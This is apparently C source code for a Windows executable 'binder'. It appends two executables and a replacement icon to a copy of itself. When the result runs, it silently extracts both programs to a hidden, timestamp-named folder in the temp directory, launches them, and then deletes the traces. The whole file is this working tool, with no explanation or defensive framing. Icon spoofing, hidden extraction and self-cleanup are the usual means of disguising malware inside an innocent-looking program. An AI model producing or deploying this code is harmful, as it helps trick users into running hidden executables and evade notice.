#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define MAX_PATH_LENGTH 260

// Structure for ICON resource data
#pragma pack(push, 2)
typedef struct {
    WORD reserved;       // Reserved (must be 0)
    WORD type;           // Resource type (1 for icon)
    WORD count;          // Number of icons
} ICONDIR;

typedef struct {
    BYTE width;          // Icon width
    BYTE height;         // Icon height
    BYTE color_count;    // Number of colors (0 if >= 8bpp)
    BYTE reserved;       // Reserved (must be 0)
    WORD planes;         // Color planes
    WORD bit_count;      // Bits per pixel
    DWORD bytes_in_res;  // Size of the icon data
    DWORD image_offset;  // Offset to the icon image data
} ICONDIRENTRY;

typedef struct {
    WORD id_reserved;    // Reserved (must be 0)
    WORD id_type;        // Resource type (1 for icon)
    WORD id_count;       // Number of icons
    // Followed by id_entries[id_count]
} GRPICONDIR;

typedef struct {
    BYTE width;          // Icon width
    BYTE height;         // Icon height
    BYTE color_count;    // Number of colors (0 if >= 8bpp)
    BYTE reserved;       // Reserved (must be 0)
    WORD planes;         // Color planes
    WORD bit_count;      // Bits per pixel
    DWORD bytes_in_res;  // Size of the icon data
    WORD id;             // Resource ID
} GRPICONDIRENTRY;
#pragma pack(pop)

int main(int argc, char *argv[]) {
    char self_path[MAX_PATH_LENGTH];
    GetModuleFileName(NULL, self_path, MAX_PATH_LENGTH);
    
    FILE *self_file = fopen(self_path, "rb");
    if (!self_file) {
        return 1;
    }
    
    if (argc == 1) {
        fseek(self_file, 0, SEEK_END);
        long self_size = ftell(self_file);
        fseek(self_file, 0, SEEK_SET);
        
        char *self_data = (char *)malloc(self_size);
        if (!self_data) {
            fclose(self_file);
            return 1;
        }
        size_t self_read = fread(self_data, 1, self_size, self_file);
        if (self_read != self_size) {
            free(self_data);
            fclose(self_file);
            return 1;
        }
        fclose(self_file);
        
        long exe1_size, exe2_size;
        memcpy(&exe1_size, self_data + self_size - sizeof(long) * 2, sizeof(long));
        memcpy(&exe2_size, self_data + self_size - sizeof(long), sizeof(long));
        
        long exe1_offset = self_size - sizeof(long) * 2 - MAX_PATH_LENGTH * 2 - exe1_size - exe2_size;
        long exe2_offset = self_size - sizeof(long) * 2 - MAX_PATH_LENGTH * 2 - exe2_size;
        
        if (exe1_offset < 0 || exe2_offset < 0) {
            free(self_data);
            return 1;
        }
        
        char temp_dir[MAX_PATH_LENGTH];
        GetTempPath(MAX_PATH_LENGTH, temp_dir);
        
        // Generate a random hidden folder name (e.g., .12345678)
        char hidden_folder[MAX_PATH_LENGTH];
        DWORD tick = GetTickCount();
        snprintf(hidden_folder, MAX_PATH_LENGTH, "%s\\.%.8lu", temp_dir, tick);
        CreateDirectoryA(hidden_folder, NULL);
        
        char exe1_path[MAX_PATH_LENGTH];
        char exe2_path[MAX_PATH_LENGTH];
        
        char extracted1_name[MAX_PATH_LENGTH];
        char extracted2_name[MAX_PATH_LENGTH];
        
        long names_offset = self_size - sizeof(long) * 2 - MAX_PATH_LENGTH * 2;
        memcpy(extracted1_name, self_data + names_offset, MAX_PATH_LENGTH);
        memcpy(extracted2_name, self_data + names_offset + MAX_PATH_LENGTH, MAX_PATH_LENGTH);
        
        snprintf(exe1_path, MAX_PATH_LENGTH, "%s\\%s", hidden_folder, extracted1_name);
        snprintf(exe2_path, MAX_PATH_LENGTH, "%s\\%s", hidden_folder, extracted2_name);
        
        FILE *exe1_file = fopen(exe1_path, "wb");
        if (!exe1_file) {
            free(self_data);
            return 1;
        }
        size_t exe1_written = fwrite(self_data + exe1_offset, 1, exe1_size, exe1_file);
        if (exe1_written != exe1_size) {
            fclose(exe1_file);
            free(self_data);
            return 1;
        }
        fclose(exe1_file);
        
        FILE *exe2_file = fopen(exe2_path, "wb");
        if (!exe2_file) {
            free(self_data);
            return 1;
        }
        size_t exe2_written = fwrite(self_data + exe2_offset, 1, exe2_size, exe2_file);
        if (exe2_written != exe2_size) {
            fclose(exe2_file);
            free(self_data);
            return 1;
        }
        fclose(exe2_file);
        
        free(self_data);
        
        STARTUPINFO si1 = { sizeof(si1) };
        STARTUPINFO si2 = { sizeof(si2) };
        PROCESS_INFORMATION pi1, pi2;
        
        if (!CreateProcess(exe1_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si1, &pi1)) {
            return 1;
        }
        
        if (!CreateProcess(exe2_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi2)) {
            CloseHandle(pi1.hProcess);
            CloseHandle(pi1.hThread);
            return 1;
        }
        
        WaitForSingleObject(pi1.hProcess, INFINITE);
        WaitForSingleObject(pi2.hProcess, INFINITE);
        
        CloseHandle(pi1.hProcess);
        CloseHandle(pi1.hThread);
        CloseHandle(pi2.hProcess);
        CloseHandle(pi2.hThread);
        
        DeleteFile(exe1_path);
        DeleteFile(exe2_path);
        RemoveDirectoryA(hidden_folder);
        
        return 0;
    }
    
    if (argc != 7) {
        fclose(self_file);
        return 1;
    }
    
    const char *exe1_path = argv[1];
    const char *exe2_path = argv[2];
    const char *output_path = argv[3];
    const char *extracted1_name = argv[4];
    const char *extracted2_name = argv[5];
    const char *icon_path = argv[6];
    
    FILE *exe1_file = fopen(exe1_path, "rb");
    if (!exe1_file) {
        fclose(self_file);
        return 1;
    }
    
    FILE *exe2_file = fopen(exe2_path, "rb");
    if (!exe2_file) {
        fclose(exe1_file);
        fclose(self_file);
        return 1;
    }
    
    fseek(self_file, 0, SEEK_END);
    long self_size = ftell(self_file);
    fseek(self_file, 0, SEEK_SET);
    
    fseek(exe1_file, 0, SEEK_END);
    long exe1_size = ftell(exe1_file);
    fseek(exe1_file, 0, SEEK_SET);
    
    fseek(exe2_file, 0, SEEK_END);
    long exe2_size = ftell(exe2_file);
    fseek(exe2_file, 0, SEEK_SET);
    
    char *self_data = (char *)malloc(self_size);
    if (!self_data) {
        fclose(self_file);
        fclose(exe1_file);
        fclose(exe2_file);
        return 1;
    }
    size_t self_read = fread(self_data, 1, self_size, self_file);
    if (self_read != self_size) {
        free(self_data);
        fclose(self_file);
        fclose(exe1_file);
        fclose(exe2_file);
        return 1;
    }
    fclose(self_file);
    
    char *exe1_data = (char *)malloc(exe1_size);
    if (!exe1_data) {
        free(self_data);
        fclose(exe1_file);
        fclose(exe2_file);
        return 1;
    }
    size_t exe1_read = fread(exe1_data, 1, exe1_size, exe1_file);
    if (exe1_read != exe1_size) {
        free(self_data);
        free(exe1_data);
        fclose(exe1_file);
        fclose(exe2_file);
        return 1;
    }
    fclose(exe1_file);
    
    char *exe2_data = (char *)malloc(exe2_size);
    if (!exe2_data) {
        free(self_data);
        free(exe1_data);
        fclose(exe2_file);
        return 1;
    }
    size_t exe2_read = fread(exe2_data, 1, exe2_size, exe2_file);
    if (exe2_read != exe2_size) {
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        fclose(exe2_file);
        return 1;
    }
    fclose(exe2_file);
    
    char *icon_data = NULL;
    long icon_size = 0;
    if (strcmp(icon_path, "") != 0) {
        FILE *icon_file = fopen(icon_path, "rb");
        if (!icon_file) {
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            return 1;
        }
        
        fseek(icon_file, 0, SEEK_END);
        icon_size = ftell(icon_file);
        fseek(icon_file, 0, SEEK_SET);
        
        icon_data = (char *)malloc(icon_size);
        if (!icon_data) {
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            fclose(icon_file);
            return 1;
        }
        size_t icon_read = fread(icon_data, 1, icon_size, icon_file);
        if (icon_read != icon_size) {
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            fclose(icon_file);
            return 1;
        }
        fclose(icon_file);
    }
    
    FILE *output_file = fopen(output_path, "wb");
    if (!output_file) {
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        if (icon_data) free(icon_data);
        return 1;
    }
    
    size_t self_written = fwrite(self_data, 1, self_size, output_file);
    if (self_written != self_size) {
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        if (icon_data) free(icon_data);
        return 1;
    }
    
    fclose(output_file);
    
    if (icon_data) {
        HANDLE hUpdate = BeginUpdateResource(output_path, FALSE);
        if (!hUpdate) {
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            return 1;
        }
        
        ICONDIR *icon_dir = (ICONDIR *)icon_data;
        if (icon_dir->type != 1 || icon_dir->count < 1) {
            EndUpdateResource(hUpdate, TRUE);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            return 1;
        }
        
        ICONDIRENTRY *icon_entries = (ICONDIRENTRY *)(icon_data + sizeof(ICONDIR));
        
        for (WORD i = 0; i < icon_dir->count; i++) {
            if (!UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(i + 1), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), icon_data + icon_entries[i].image_offset, icon_entries[i].bytes_in_res)) {
                EndUpdateResource(hUpdate, TRUE);
                free(self_data);
                free(exe1_data);
                free(exe2_data);
                free(icon_data);
                return 1;
            }
        }
        
        size_t grp_icon_size = sizeof(GRPICONDIR) + icon_dir->count * sizeof(GRPICONDIRENTRY);
        GRPICONDIR *grp_icon = (GRPICONDIR *)malloc(grp_icon_size);
        if (!grp_icon) {
            EndUpdateResource(hUpdate, TRUE);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            return 1;
        }
        
        grp_icon->id_reserved = 0;
        grp_icon->id_type = 1;
        grp_icon->id_count = icon_dir->count;
        GRPICONDIRENTRY *grp_entries = (GRPICONDIRENTRY *)(grp_icon + 1);
        for (WORD i = 0; i < icon_dir->count; i++) {
            grp_entries[i].width = icon_entries[i].width;
            grp_entries[i].height = icon_entries[i].height;
            grp_entries[i].color_count = icon_entries[i].color_count;
            grp_entries[i].reserved = icon_entries[i].reserved;
            grp_entries[i].planes = icon_entries[i].planes;
            grp_entries[i].bit_count = icon_entries[i].bit_count;
            grp_entries[i].bytes_in_res = icon_entries[i].bytes_in_res;
            grp_entries[i].id = i + 1;
        }
        
        if (!UpdateResource(hUpdate, RT_GROUP_ICON, "MAINICON", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), grp_icon, grp_icon_size)) {
            EndUpdateResource(hUpdate, TRUE);
            free(grp_icon);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            return 1;
        }
        
        if (!EndUpdateResource(hUpdate, FALSE)) {
            free(grp_icon);
            free(self_data);
            free(exe1_data);
            free(exe2_data);
            free(icon_data);
            return 1;
        }
        free(grp_icon);
        free(icon_data);
    }
    
    output_file = fopen(output_path, "ab");
    if (!output_file) {
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        return 1;
    }
    
    size_t exe1_written = fwrite(exe1_data, 1, exe1_size, output_file);
    if (exe1_written != exe1_size) {
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        return 1;
    }
    
    size_t exe2_written = fwrite(exe2_data, 1, exe2_size, output_file);
    if (exe2_written != exe2_size) {
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        return 1;
    }
    
    char extracted1_name_buffer[MAX_PATH_LENGTH] = {0};
    char extracted2_name_buffer[MAX_PATH_LENGTH] = {0};
    strncpy(extracted1_name_buffer, extracted1_name, MAX_PATH_LENGTH - 1);
    strncpy(extracted2_name_buffer, extracted2_name, MAX_PATH_LENGTH - 1);
    size_t name1_written = fwrite(extracted1_name_buffer, 1, MAX_PATH_LENGTH, output_file);
    if (name1_written != MAX_PATH_LENGTH) {
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        return 1;
    }
    
    size_t name2_written = fwrite(extracted2_name_buffer, 1, MAX_PATH_LENGTH, output_file);
    if (name2_written != MAX_PATH_LENGTH) {
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        return 1;
    }
    
    size_t size1_written = fwrite(&exe1_size, sizeof(long), 1, output_file);
    if (size1_written != 1) {
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        return 1;
    }
    
    size_t size2_written = fwrite(&exe2_size, sizeof(long), 1, output_file);
    if (size2_written != 1) {
        fclose(output_file);
        free(self_data);
        free(exe1_data);
        free(exe2_data);
        return 1;
    }
    
    fclose(output_file);
    free(self_data);
    free(exe1_data);
    free(exe2_data);
    
    return 0;
}